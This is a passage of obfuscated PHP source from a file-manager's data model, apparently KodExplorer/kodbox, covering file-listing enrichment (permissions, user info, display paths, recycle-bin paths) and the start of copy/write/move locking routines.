$ˆÈ¥Ì×£ = array_to_keyvalue_group($ó•Š£¾¯, $ĞÏ¶êíÑ[76], $ĞÏ¶êíÑ[421]); $§™ŒãĞ‹ = array_to_keyvalue($¦‘½ßƒÈ, $ĞÏ¶êíÑ[76]); $·ãè¦íÛ = array_to_keyvalue_group($õì¶·Ñ, $ĞÏ¶êíÑ[397]); foreach ($¤â§¤ê¢ as &$’ãç–Œå) { $’ãç–Œå[$ĞÏ¶êíÑ[85]] = array($ĞÏ¶êíÑ[471] => 0, $ĞÏ¶êíÑ[472] => 0, $ĞÏ¶êíÑ[473] => 0); if (isset($§™ŒãĞ‹[$’ãç–Œå[$ĞÏ¶êíÑ[397]]])) { $’ãç–Œå[$ĞÏ¶êíÑ[85]][$ĞÏ¶êíÑ[474]] = 1; $’ãç–Œå[$ĞÏ¶êíÑ[85]][$ĞÏ¶êíÑ[475]] = $§™ŒãĞ‹[$’ãç–Œå[$ĞÏ¶êíÑ[397]]][$ĞÏ¶êíÑ[28]]; } if (isset($ˆÈ¥Ì×£[$’ãç–Œå[$ĞÏ¶êíÑ[397]]])) { $’ãç–Œå[$ĞÏ¶êíÑ[85]][$ĞÏ¶êíÑ[476]] = array(); foreach ($ˆÈ¥Ì×£[$’ãç–Œå[$ĞÏ¶êíÑ[397]]] as $†œ§Ğ ) { $ª´ıÚ„ = $øŸ½¡§ó[$†œ§Ğ ]; $’ãç–Œå[$ĞÏ¶êíÑ[85]][$ĞÏ¶êíÑ[476]][] = array($ĞÏ¶êíÑ[477] => $ª´ıÚ„[$ĞÏ¶êíÑ[395]], $ĞÏ¶êíÑ[415] => $ª´ıÚ„[$ĞÏ¶êíÑ[28]], $ĞÏ¶êíÑ[478] => $ª´ıÚ„[$ĞÏ¶êíÑ[479]]); } } if (isset($·ãè¦íÛ[$’ãç–Œå[$ĞÏ¶êíÑ[397]]])) { $’ãç–Œå[$ĞÏ¶êíÑ[85]][$ĞÏ¶êíÑ[480]] = array(); foreach ($·ãè¦íÛ[$’ãç–Œå[$ĞÏ¶êíÑ[397]]] as $àÊç„‹) { $’ãç–Œå[$ĞÏ¶êíÑ[85]][$ĞÏ¶êíÑ[480]] = array($ĞÏ¶êíÑ[481] => $àÊç„‹[$ĞÏ¶êíÑ[482]], $ĞÏ¶êíÑ[483] => $àÊç„‹[$ĞÏ¶êíÑ[484]], $ĞÏ¶êíÑ[485] => $àÊç„‹[$ĞÏ¶êíÑ[397]], $ĞÏ¶êíÑ[486] => $àÊç„‹[$ĞÏ¶êíÑ[487]], $ĞÏ¶êíÑ[488] => $àÊç„‹[$ĞÏ¶êíÑ[489]], $ĞÏ¶êíÑ[490] => $àÊç„‹[$ĞÏ¶êíÑ[490]], $ĞÏ¶êíÑ[491] => $àÊç„‹[$ĞÏ¶êíÑ[491]]); } } } unset($’ãç–Œå); return $¤â§¤ê¢; } protected function _listAppendChildren(&$ €­ªŒç, $Ù‹Œ•äú) { $ñ¤¦Æ™ı =& $_SERVER[¥ÙÌÜ¾ê]; $¡½‹¿¦” = array(); $óî²€¯õ = array($ñ¤¦Æ™ı[203] => 0, $ñ¤¦Æ™ı[204] => 0); foreach ($ €­ªŒç as &$šÊıÎÖĞ) { if (!$šÊıÎÖĞ[$ñ¤¦Æ™ı[405]]) { continue; } $¡½‹¿¦”[] = $šÊıÎÖĞ[$ñ¤¦Æ™ı[397]]; } unset($šÊıÎÖĞ); if (!$¡½‹¿¦”) { return; } $‘»Æ—å® = array($ñ¤¦Æ™ı[492] => array($ñ¤¦Æ™ı[7], $¡½‹¿¦”)); $û§‰ÆÍ = array($ñ¤¦Æ™ı[492], $ñ¤¦Æ™ı[405], $ñ¤¦Æ™ı[493] => $ñ¤¦Æ™ı[494]); $Ú©íœµ¡ = $this->field($û§‰ÆÍ)->where($‘»Æ—å®)->group($ñ¤¦Æ™ı[495])->select(); $ä×©¿Êğ = array(); foreach ($Ú©íœµ¡ as $À•ò¢ò—) { $î“ïŒ¶ = $À•ò¢ò—[$ñ¤¦Æ™ı[492]]; $ô†ÓºÒ¹ = $À•ò¢ò—[$ñ¤¦Æ™ı[405]] == $ñ¤¦Æ™ı[87] ? $ñ¤¦Æ™ı[204] : $ñ¤¦Æ™ı[203]; if (!isset($ä×©¿Êğ[$î“ïŒ¶])) { $ä×©¿Êğ[$î“ïŒ¶] = array($ñ¤¦Æ™ı[203] => 0, $ñ¤¦Æ™ı[204] => 0); } $ä×©¿Êğ[$î“ïŒ¶][$ô†ÓºÒ¹] += $À•ò¢ò—[$ñ¤¦Æ™ı[494]]; } foreach ($ €­ªŒç as &$šÊıÎÖĞ) { if (!$šÊıÎÖĞ[$ñ¤¦Æ™ı[405]]) { continue; } $÷âº¶Éş = is_array($ä×©¿Êğ[$šÊıÎÖĞ[$ñ¤¦Æ™ı[397]]]) ? $ä×©¿Êğ[$šÊıÎÖĞ[$ñ¤¦Æ™ı[397]]] : $óî²€¯õ; $šÊıÎÖĞ[$ñ¤¦Æ™ı[204]] = $÷âº¶Éş[$ñ¤¦Æ™ı[204]]; $šÊıÎÖĞ[$ñ¤¦Æ™ı[203]] = $÷âº¶Éş[$ñ¤¦Æ™ı[203]]; unset($šÊıÎÖĞ[$ñ¤¦Æ™ı[407]]); } unset($šÊıÎÖĞ); } protected function _listAppendAuth(&$ö¥ó…âé) { $°ÕÃÏœ” =& $_SERVER[¥ÙÌÜ¾ê]; if (!defined($°ÕÃÏœ”[468])) { return; } $ˆçôˆ¦× = array(); foreach ($ö¥ó…âé as $êØüĞ) { if ($êØüĞ[$°ÕÃÏœ”[406]] == self::TYPE_GROUP) { $ˆçôˆ¦×[] = $êØüĞ[$°ÕÃÏœ”[397]]; } } if (!$ˆçôˆ¦×) { return; } $ÄÁíšÏ› = array_to_keyvalue($ö¥ó…âé, $°ÕÃÏœ”[397]); $æëù€¨ = Model($°ÕÃÏœ”[496])->getSourceList($ˆçôˆ¦×, $ÄÁíšÏ›); foreach ($ö¥ó…âé as $ĞÍÊıÌ´ => &$êØüĞ) { $êØüĞ[$°ÕÃÏœ”[408]] = $æëù€¨[$êØüĞ[$°ÕÃÏœ”[397]]]; if (!$êØüĞ[$°ÕÃÏœ”[408]] && $êØüĞ[$°ÕÃÏœ”[406]] == self::TYPE_GROUP) { $êØüĞ[$°ÕÃÏœ”[408]] = Action($°ÕÃÏœ”[497])->pathGroupAuthMake($êØüĞ[$°ÕÃÏœ”[498]]); if (!$êØüĞ[$°ÕÃÏœ”[408]] && !_get($GLOBALS, $°ÕÃÏœ”[499])) { $êØüĞ[$°ÕÃÏœ”[196]] = !1; $êØüĞ[$°ÕÃÏœ”[195]] = !1; } } if ($êØüĞ[$°ÕÃÏœ”[408]]) { $êØüĞ[$°ÕÃÏœ”[196]] = AuthModel::authCheckEdit($êØüĞ[$°ÕÃÏœ”[408]][$°ÕÃÏœ”[409]]); $êØüĞ[$°ÕÃÏœ”[195]] = AuthModel::authCheckView($êØüĞ[$°ÕÃÏœ”[408]][$°ÕÃÏœ”[409]]); } $this->groupPathDisplay($êØüĞ); } unset($êØüĞ); } public function _listAppendAuthSecret(&$ÑŒ¥ˆÌš) { $ÉÚÈÍùÙ =& $_SERVER[¥ÙÌÜ¾ê]; if (Model($ÉÚÈÍùÙ[427])->get($ÉÚÈÍùÙ[500]) != $ÉÚÈÍùÙ[87]) { return; } static $¤œÍ†Ì = false; if (!$¤œÍ†Ì) { $ı¡ŞØ”Ú = Model($ÉÚÈÍùÙ[501]); $ë¸Ùªã = Model($ÉÚÈÍùÙ[502]); $¤œÍ†Ì = $ë¸Ùªã->listData(); $¤œÍ†Ì = array_to_keyvalue($¤œÍ†Ì, $ÉÚÈÍùÙ[397]); $§İ« = json_decode(Model($ÉÚÈÍùÙ[427])->get($ÉÚÈÍùÙ[503]), !0); $§İ« = array_to_keyvalue($§İ«, $ÉÚÈÍùÙ[395]); foreach ($¤œÍ†Ì as $âœš’²± => $Î•ÑÊÑ×) { $í çÃÊê = $§İ«[$Î•ÑÊÑ×[$ÉÚÈÍùÙ[504]]]; if (!$í çÃÊê) { $ë¸Ùªã->remove($Î•ÑÊÑ×[$ÉÚÈÍùÙ[395]]); unset($¤œÍ†Ì[$âœš’²±]); continue; } $ß«­èÚ· = $ı¡ŞØ”Ú->listData($í çÃÊê[$ÉÚÈÍùÙ[408]]); if (!$ß«­èÚ·) { $ë¸Ùªã->remove($Î•ÑÊÑ×[$ÉÚÈÍùÙ[395]]); unset($¤œÍ†Ì[$âœš’²±]); continue; } $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]] = $ß«­èÚ·; $Î•ÑÊÑ×[$ÉÚÈÍùÙ[505]] = $í çÃÊê; $Î•ÑÊÑ×[$ÉÚÈÍùÙ[506]] = Model($ÉÚÈÍùÙ[507])->getInfoSimpleOuter($Î•ÑÊÑ×[$ÉÚÈÍùÙ[446]]); $¤œÍ†Ì[$âœš’²±] = $Î•ÑÊÑ×; } } $¼¿·ìéé = defined($ÉÚÈÍùÙ[508]) ? USER_ID : $ÉÚÈÍùÙ[33]; $â ÛáëÁ = array(); $Î’“ƒô¥ = $this->_listAppendPath($â ÛáëÁ, !0); foreach ($ÑŒ¥ˆÌš as $âœš’²± => &$Î•ÑÊÑ×) { if (!is_array($Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]])) { continue; } if ($Î•ÑÊÑ×[$ÉÚÈÍùÙ[406]] != $ÉÚÈÍùÙ[509]) { continue; } if (isset($¤œÍ†Ì[$Î•ÑÊÑ×[$ÉÚÈÍùÙ[397]]])) { $ô¸±İ¬† = $¤œÍ†Ì[$Î•ÑÊÑ×[$ÉÚÈÍùÙ[397]]]; if (!is_array($Î•ÑÊÑ×[$ÉÚÈÍùÙ[459]])) { $Î•ÑÊÑ×[$ÉÚÈÍùÙ[459]] = array(); } $Î•ÑÊÑ×[$ÉÚÈÍùÙ[459]][$ÉÚÈÍùÙ[510]] = $ô¸±İ¬†[$ÉÚÈÍùÙ[504]]; $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[511]] = $ô¸±İ¬†; $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[512]] = $Î•ÑÊÑ×[$ÉÚÈÍùÙ[513]]; $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[514]] = $ÉÚÈÍùÙ[87]; if ($ô¸±İ¬†[$ÉÚÈÍùÙ[446]] != $¼¿·ìéé) { $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[409]] = $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[409]] & $ô¸±İ¬†[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[408]]; } continue; } $¶´èØÓ§ = $this->parentLevelArray($Î•ÑÊÑ×[$ÉÚÈÍùÙ[515]]); $ğ¸ıÒ³ = array_reverse($¶´èØÓ§); foreach ($ğ¸ıÒ³ as $úÈàİÄ¨ => $³Ôœ¸) { if (!isset($¤œÍ†Ì[$³Ôœ¸])) { continue; } $ô¸±İ¬† = $¤œÍ†Ì[$³Ôœ¸]; $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[511]] = $ô¸±İ¬†; if ($ô¸±İ¬†[$ÉÚÈÍùÙ[446]] != $¼¿·ìéé) { $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[409]] = $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[409]] & $ô¸±İ¬†[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[408]]; } $‚ ¢Ë‘à = $ÉÚÈÍùÙ[33]; $ßĞš†šÌ = count($¶´èØÓ§) - $úÈàİÄ¨; for ($ËÁ‰Õöø = 0; $ËÁ‰Õöø < $ßĞš†šÌ; $ËÁ‰Õöø++) { if (!isset($Î’“ƒô¥[$¶´èØÓ§[$ËÁ‰Õöø]])) { $‚ ¢Ë‘à = $ÉÚÈÍùÙ[33]; break; } $‚ ¢Ë‘à = $‚ ¢Ë‘à . rtrim($Î’“ƒô¥[$¶´èØÓ§[$ËÁ‰Õöø]], $ÉÚÈÍùÙ[8]) . $ÉÚÈÍùÙ[8]; } $Î•ÑÊÑ×[$ÉÚÈÍùÙ[408]][$ÉÚÈÍùÙ[512]] = rtrim($‚ ¢Ë‘à, $ÉÚÈÍùÙ[8]) . $ÉÚÈÍùÙ[8]; break; } } unset($Î•ÑÊÑ×); } public function groupPathDisplay(&$Ÿ±ŸÛö£) { $ëÀ–Á’® =& $_SERVER[¥ÙÌÜ¾ê]; if ($Ÿ±ŸÛö£[$ëÀ–Á’®[406]] != self::TYPE_GROUP) { return; } $Ì´¹¯»Ü = Model($ëÀ–Á’®[516])->getInfo($Ÿ±ŸÛö£[$ëÀ–Á’®[498]]); $™®‡€ÙŞ = $this->parentLevelArray($Ì´¹¯»Ü[$ëÀ–Á’®[515]]); $ı‡ˆ„É = $ëÀ–Á’®[33]; foreach ($™®‡€ÙŞ as $„ù‹óø) { $ÑáƒŒê¤ = Model($ëÀ–Á’®[516])->getInfo($„ù‹óø); $ı‡ˆ„É .= $ÑáƒŒê¤[$ëÀ–Á’®[85]][$ëÀ–Á’®[397]] . $ëÀ–Á’®[47]; } $Ÿ±ŸÛö£[$ëÀ–Á’®[517]] = $Ì´¹¯»Ü[$ëÀ–Á’®[492]]; $Ÿ±ŸÛö£[$ëÀ–Á’®[518]] = $Ì´¹¯»Ü[$ëÀ–Á’®[515]]; $Ÿ±ŸÛö£[$ëÀ–Á’®[519]] = $Ì´¹¯»Ü[$ëÀ–Á’®[520]]; $Ÿ±ŸÛö£[$ëÀ–Á’®[521]] = $ı‡ˆ„É . $Ì´¹¯»Ü[$ëÀ–Á’®[85]][$ëÀ–Á’®[397]]; } protected function _listAppendPath(&$è‚ÙøÊƒ, $¢ú³‡¼Î = false) { $¦™ÃÖôµ =& $_SERVER[¥ÙÌÜ¾ê]; static $ò‰ÚªÆå = array(); $ı½ä²Ö = array(); $¶–®½á = array(); if ($¢ú³‡¼Î) { return $ò‰ÚªÆå; } foreach ($è‚ÙøÊƒ as &$±å¯«¢) { $ó¹Û»‡ = $±å¯«¢[$¦™ÃÖôµ[397]]; if ($±å¯«¢[$¦™ÃÖôµ[405]] == $¦™ÃÖôµ[87] && $±å¯«¢[$¦™ÃÖôµ[492]] != 0) { $ò‰ÚªÆå[$ó¹Û»‡] = $±å¯«¢[$¦™ÃÖôµ[28]]; } if ($±å¯«¢[$¦™ÃÖôµ[405]] == $¦™ÃÖôµ[87] && $±å¯«¢[$¦™ÃÖôµ[492]] == 0 && !isset($ò‰ÚªÆå[$ó¹Û»‡])) { $ò‰ÚªÆå[$ó¹Û»‡] = $this->_listAppendPathRoot($±å¯«¢, array()); } if (isset($¶–®½á[$±å¯«¢[$¦™ÃÖôµ[515]]])) { continue; } $¶–®½á[$±å¯«¢[$¦™ÃÖôµ[515]]] = !0; $­€ÒàÙ = $this->parentLevelArray($±å¯«¢[$¦™ÃÖôµ[515]]); foreach ($­€ÒàÙ as $è„¹¯¯¬ => $ğ–ûÇù) { if (isset($ò‰ÚªÆå[$ğ–ûÇù])) { continue; } if ($è„¹¯¯¬ == 0) { $ò‰ÚªÆå[$ğ–ûÇù] = $this->_listAppendPathRoot($±å¯«¢, $­€ÒàÙ); } if ($è„¹¯¯¬ != 0) { $ı½ä²Ö[] = $ğ–ûÇù; } } } unset($±å¯«¢); $ı½ä²Ö = array_unique($ı½ä²Ö); if (count($ı½ä²Ö) > 0) { $•õ³„ˆÏ = array($¦™ÃÖôµ[412] => array($¦™ÃÖôµ[413], $ı½ä²Ö)); if (count($ı½ä²Ö) == 1) { $°¡ ñ–‚ = $this->sourceInfo($ı½ä²Ö[0]); $Ş£Ëæ™½ = is_array($°¡ ñ–‚) ? array($°¡ ñ–‚) : !1; } else { $Ş£Ëæ™½ = $this->field($¦™ÃÖôµ[522])->where($•õ³„ˆÏ)->select(); } if (!$Ş£Ëæ™½) { $Ş£Ëæ™½ = array(); } foreach ($Ş£Ëæ™½ as $ÇÀÖâƒÔ) { $ò‰ÚªÆå[$ÇÀÖâƒÔ[$¦™ÃÖôµ[397]]] = $ÇÀÖâƒÔ[$¦™ÃÖôµ[28]]; } } $‚®ª‹° = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ø×òåÉŞ = array(); foreach ($è‚ÙøÊƒ as &$±å¯«¢) { $ãˆßÒ€ = $±å¯«¢[$¦™ÃÖôµ[515]]; $š¥£ÂÂ = $¦™ÃÖôµ[33]; if (isset($ø×òåÉŞ[$ãˆßÒ€])) { $š¥£ÂÂ = $ø×òåÉŞ[$ãˆßÒ€]; } else { $­€ÒàÙ = $this->parentLevelArray($±å¯«¢[$¦™ÃÖôµ[515]]); foreach ($­€ÒàÙ as $è„¹¯¯¬ => $ğ–ûÇù) { if (isset($ò‰ÚªÆå[$ğ–ûÇù])) { $š¥£ÂÂ .= $ò‰ÚªÆå[$ğ–ûÇù] . $¦™ÃÖôµ[8]; } } $ø×òåÉŞ[$ãˆßÒ€] = $š¥£ÂÂ; } $š¥£ÂÂ .= $±å¯«¢[$¦™ÃÖôµ[28]]; if ($±å¯«¢[$¦™ÃÖôµ[405]] == $¦™ÃÖôµ[87]) { $š¥£ÂÂ .= $¦™ÃÖôµ[8]; } $±å¯«¢[$¦™ÃÖôµ[513]] = str_replace($¦™ÃÖôµ[523], $¦™ÃÖôµ[8], $š¥£ÂÂ); if ($±å¯«¢[$¦™ÃÖôµ[492]] == $¦™ÃÖôµ[191]) { $±å¯«¢[$¦™ÃÖôµ[28]] = trim($ò‰ÚªÆå[$±å¯«¢[$¦™ÃÖôµ[397]]], $¦™ÃÖôµ[8]); $±å¯«¢[$¦™ÃÖôµ[513]] = $±å¯«¢[$¦™ÃÖôµ[28]] . $¦™ÃÖôµ[8]; } if (intval($±å¯«¢[$¦™ÃÖôµ[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($±å¯«¢, $­€ÒàÙ, $‚®ª‹°); } } unset($±å¯«¢); return $è‚ÙøÊƒ; } private function _listAppendPathRecycle(&$ÉÄÂ¬Æ², $ğñÉ¥½œ, $‰ß¯½‹) { $‡»ÔŠ£ª =& $_SERVER[¥ÙÌÜ¾ê]; if (!in_array($‰ß¯½‹, $ğñÉ¥½œ) && $ÉÄÂ¬Æ²[$‡»ÔŠ£ª[397]] != $‰ß¯½‹) { return; } $ƒœÒÚ” = explode($‡»ÔŠ£ª[8], trim($ÉÄÂ¬Æ²[$‡»ÔŠ£ª[513]], $‡»ÔŠ£ª[8])); $´èú³Áê = implode($‡»ÔŠ£ª[8], array_slice($ƒœÒÚ”, 2)); $ÉÄÂ¬Æ²[$‡»ÔŠ£ª[513]] = $‡»ÔŠ£ª[8] . LNG($‡»ÔŠ£ª[524]) . $‡»ÔŠ£ª[8] . ltrim($´èú³Áê, $‡»ÔŠ£ª[8]); $ÉÄÂ¬Æ²[$‡»ÔŠ£ª[515]] = $‡»ÔŠ£ª[525] . implode($‡»ÔŠ£ª[47], array_slice($ğñÉ¥½œ, 1)) . $‡»ÔŠ£ª[47]; if ($ÉÄÂ¬Æ²[$‡»ÔŠ£ª[397]] == $‰ß¯½‹) { $ÉÄÂ¬Æ²[$‡»ÔŠ£ª[515]] = $‡»ÔŠ£ª[525]; $ÉÄÂ¬Æ²[$‡»ÔŠ£ª[492]] = $‡»ÔŠ£ª[191]; $ÉÄÂ¬Æ²[$‡»ÔŠ£ª[28]] = LNG($‡»ÔŠ£ª[524]); } $ÉÄÂ¬Æ²[$‡»ÔŠ£ª[526]] = $‡»ÔŠ£ª[527]; } protected function _listAppendPathRoot(&$±¡í‡€œ, $ËÂŒ¦Àİ) { $ÖÙÓÔ¢Ç =& $_SERVER[¥ÙÌÜ¾ê]; $ÅÙç”Ÿë = $ÖÙÓÔ¢Ç[33]; if ($±¡í‡€œ[$ÖÙÓÔ¢Ç[406]] == self::TYPE_USER) { if (defined($ÖÙÓÔ¢Ç[468]) && $±¡í‡€œ[$ÖÙÓÔ¢Ç[498]] == USER_ID) { $ÅÙç”Ÿë = LNG($ÖÙÓÔ¢Ç[528]); if (!$ËÂŒ¦Àİ) { $±¡í‡€œ[$ÖÙÓÔ¢Ç[28]] = $ÅÙç”Ÿë; } } else { $€™±ëğ· = Model($ÖÙÓÔ¢Ç[507])->getInfoSimple($±¡í‡€œ[$ÖÙÓÔ¢Ç[498]]); $ÅÙç”Ÿë = LNG($ÖÙÓÔ¢Ç[529]) . $ÖÙÓÔ¢Ç[160] . $€™±ëğ·[$ÖÙÓÔ¢Ç[28]] . $ÖÙÓÔ¢Ç[530]; } } else { if ($±¡í‡€œ[$ÖÙÓÔ¢Ç[406]] == self::TYPE_GROUP) { $€™±ëğ· = Model($ÖÙÓÔ¢Ç[516])->getInfoSimple($±¡í‡€œ[$ÖÙÓÔ¢Ç[498]]); $ÅÙç”Ÿë = $€™±ëğ·[$ÖÙÓÔ¢Ç[28]]; } else { if ($±¡í‡€œ[$ÖÙÓÔ¢Ç[406]] == self::TYPE_SYSTEM) { $ÅÙç”Ÿë = $ÖÙÓÔ¢Ç[531]; } } } $ÅÙç”Ÿë = $ÅÙç”Ÿë ? $ÖÙÓÔ¢Ç[8] . $ÅÙç”Ÿë . $ÖÙÓÔ¢Ç[8] : $ÖÙÓÔ¢Ç[8]; return $ÅÙç”Ÿë; } protected function _listAppendUser(&$äà½˜–‹) { $„Å”·¯ô =& $_SERVER[¥ÙÌÜ¾ê]; $Ì¹†ÇÂ = array_to_keyvalue($äà½˜–‹, $„Å”·¯ô[33], $„Å”·¯ô[446]); $Üá’ÄÈÀ = array_to_keyvalue($äà½˜–‹, $„Å”·¯ô[33], $„Å”·¯ô[448]); $»óÔéœó = array_merge($Ì¹†ÇÂ, $Üá’ÄÈÀ); $°‹ßÒ½ = Model($„Å”·¯ô[532])->userListInfo($»óÔéœó); foreach ($äà½˜–‹ as &$ÔŒ§‰â¶) { $ÈìÆ‘µ = $ÔŒ§‰â¶[$„Å”·¯ô[446]]; $ÔŒ§‰â¶[$„Å”·¯ô[446]] = $°‹ßÒ½[$ÈìÆ‘µ] ? $°‹ßÒ½[$ÈìÆ‘µ] : !1; $ÈìÆ‘µ = $ÔŒ§‰â¶[$„Å”·¯ô[448]]; $ÔŒ§‰â¶[$„Å”·¯ô[448]] = $°‹ßÒ½[$ÈìÆ‘µ] ? $°‹ßÒ½[$ÈìÆ‘µ] : !1; if (isset($ÔŒ§‰â¶[$„Å”·¯ô[459]]) && $ÔŒ§‰â¶[$„Å”·¯ô[459]][$„Å”·¯ô[533]]) { $…ÁõõÁ = $GLOBALS[$„Å”·¯ô[6]][$„Å”·¯ô[88]][$„Å”·¯ô[534]]; if ($ÔŒ§‰â¶[$„Å”·¯ô[459]][$„Å”·¯ô[535]] <= time() - $…ÁõõÁ) { $this->metaSet($ÔŒ§‰â¶[$„Å”·¯ô[397]], $„Å”·¯ô[533], null); $this->metaSet($ÔŒ§‰â¶[$„Å”·¯ô[397]], $„Å”·¯ô[535], null); unset($ÔŒ§‰â¶[$„Å”·¯ô[459]][$„Å”·¯ô[533]]); continue; } $õÜù›½ = $ÔŒ§‰â¶[$„Å”·¯ô[459]][$„Å”·¯ô[533]]; $ÔŒ§‰â¶[$„Å”·¯ô[459]][$„Å”·¯ô[536]] = Model($„Å”·¯ô[532])->getInfoSimpleOuter($õÜù›½); } } unset($ÔŒ§‰â¶); } public function parentLevelArray($ûßÆò®) { $Ş˜Š¿È =& $_SERVER[¥ÙÌÜ¾ê]; $ûßÆò® = explode($Ş˜Š¿È[47], trim($ûßÆò®, $Ş˜Š¿È[47])); return array_remove_value($ûßÆò®, $Ş˜Š¿È[191]); } public function listAll($¡ûæ¯„Ø) { $Íäş«ï =& $_SERVER[¥ÙÌÜ¾ê]; $ÁñÕô¶ = $this->sourceInfo($¡ûæ¯„Ø); $Œ÷µÁ¦ = array($Íäş«ï[537] => array($Íäş«ï[538], $ÁñÕô¶[$Íäş«ï[515]] . $¡ûæ¯„Ø . $Íäş«ï[539]), $Íäş«ï[540] => 0); $Ïâ†Ö = $Íäş«ï[541]; $ü“’ä ¹ = "\114\x45\106\x54\x20\112\117\111\116\40{$this->tablePrefix}\x69\157\x5f\x66\x69\x6c\145\x20\x66\x69\x6c\145\x20\x6f\x6e\40\x73\x6f\x75\x72\x63\145\56\x66\151\154\145\x49\x44\x20\75\x20\146\x69\x6c\145\x2e\x66\151\x6c\145\x49\104"; $õ—œË›„ = $this->alias($Íäş«ï[438])->field($Ïâ†Ö)->where($Œ÷µÁ¦)->join($ü“’ä ¹)->select(); $this->_listAppendAuth($õ—œË›„); $this->_listAppendUser($õ—œË›„); $this->_listAppendPath($õ—œË›„); $õ—œË›„ = array_to_keyvalue($õ—œË›„, $Íäş«ï[397]); $û°ÄªÌ = "\57{$ÁñÕô¶[$Íäş«ï[28]]}\x2f"; $û°ÄªÌ = $û°ÄªÌ == $Íäş«ï[523] ? $Íäş«ï[8] : $û°ÄªÌ; $‰§ï Öä = array(); foreach ($õ—œË›„ as $§Û·´ => $×Ä²Í•Ó) { $Ûôš¼Æˆ = $this->parentLevelArray($×Ä²Í•Ó[$Íäş«ï[515]]); array_shift($Ûôš¼Æˆ); $óŒüÒ¼ƒ = $û°ÄªÌ; for ($ı”¶àÎ­ = 0; $ı”¶àÎ­ < count($Ûôš¼Æˆ); $ı”¶àÎ­++) { $óŒüÒ¼ƒ .= $õ—œË›„[$Ûôš¼Æˆ[$ı”¶àÎ­]][$Íäş«ï[28]] . $Íäş«ï[8]; } $óŒüÒ¼ƒ .= $×Ä²Í•Ó[$Íäş«ï[28]]; if ($×Ä²Í•Ó[$Íäş«ï[405]]) { $óŒüÒ¼ƒ .= $Íäş«ï[8]; } $óŒüÒ¼ƒ = str_replace($Íäş«ï[523], $Íäş«ï[8], $óŒüÒ¼ƒ); $óŒüÒ¼ƒ = str_replace($Íäş«ï[523], $Íäş«ï[8], $óŒüÒ¼ƒ); $òª”øŸ = array($Íäş«ï[416] => str_replace($Íäş«ï[523], $Íäş«ï[8], $óŒüÒ¼ƒ), $Íäş«ï[542] => intval($×Ä²Í•Ó[$Íäş«ï[405]]), $Íäş«ï[85] => $this->pathInfoFilter($×Ä²Í•Ó)); if (!$×Ä²Í•Ó[$Íäş«ï[405]]) { $òª”øŸ[$Íäş«ï[461]] = $×Ä²Í•Ó[$Íäş«ï[461]]; $òª”øŸ[$Íäş«ï[86]] = $×Ä²Í•Ó[$Íäş«ï[76]]; } $‰§ï Öä[] = $òª”øŸ; } return $‰§ï Öä; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ßµ‘ÚÎ) { $ÖÈ“àÛ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÖÈ“àÛ[543], $ßµ‘ÚÎ); $İÁ½’Ó¨ = 1; $this->_lockEvent($ßµ‘ÚÎ, array($ÖÈ“àÛ[544], $ÖÈ“àÛ[545]), $İÁ½’Ó¨); $this->_lockParent($ßµ‘ÚÎ, array($ÖÈ“àÛ[545]), $İÁ½’Ó¨); $this->_lockEvent($ßµ‘ÚÎ, array($ÖÈ“àÛ[546], $ÖÈ“àÛ[547]), $İÁ½’Ó¨); $this->_lockCheckEnd($ÖÈ“àÛ[543], $ßµ‘ÚÎ); } public function lockCopyEnd($ôï©Öà) { $ß»áÓ” =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->allowLock()) { return; } $Í¹Îá… = 0; $this->_lockEvent($ôï©Öà, array($ß»áÓ”[544], $ß»áÓ”[545]), $Í¹Îá…); $this->_lockParent($ôï©Öà, array($ß»áÓ”[545]), $Í¹Îá…); $this->_lockEvent($ôï©Öà, array($ß»áÓ”[546], $ß»áÓ”[547]), $Í¹Îá…); } public function lockWriteStart($—üŠ†ûŒ, $…îŞê‹™ = '') { $ÎÌúäÜ¯ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÎÌúäÜ¯[544], $—üŠ†ûŒ); $ø©‰ÚÏŠ = 1; $this->_lockKey($ÎÌúäÜ¯[548] . $—üŠ†ûŒ . $ÎÌúäÜ¯[95] . $…îŞê‹™, $ø©‰ÚÏŠ); $this->_lockEvent($—üŠ†ûŒ, array($ÎÌúäÜ¯[543], $ÎÌúäÜ¯[545]), $ø©‰ÚÏŠ); $this->_lockParent($—üŠ†ûŒ, array($ÎÌúäÜ¯[543], $ÎÌúäÜ¯[545]), $ø©‰ÚÏŠ); $this->_lockCheckEnd($ÎÌúäÜ¯[544], $—üŠ†ûŒ); } public function lockWriteEnd($’ç¥ä©§, $îñ´ıîÊ = '') { $«¿…°ıÜ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->allowLock()) { return; } $½¶è™ ò = 0; $this->_lockKey($«¿…°ıÜ[548] . $’ç¥ä©§ . $«¿…°ıÜ[95] . $îñ´ıîÊ, $½¶è™ ò); $this->_lockEvent($’ç¥ä©§, array($«¿…°ıÜ[543], $«¿…°ıÜ[545]), $½¶è™ ò); $this->_lockParent($’ç¥ä©§, array($«¿…°ıÜ[543], $«¿…°ıÜ[545]), $½¶è™ ò); } public function lockMoveStart($±Èé¤ˆ¡) { $ü¼Ï©¾  =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($ü¼Ï©¾ [545], $±Èé¤ˆ¡); $™ıÄº¼» = 1; 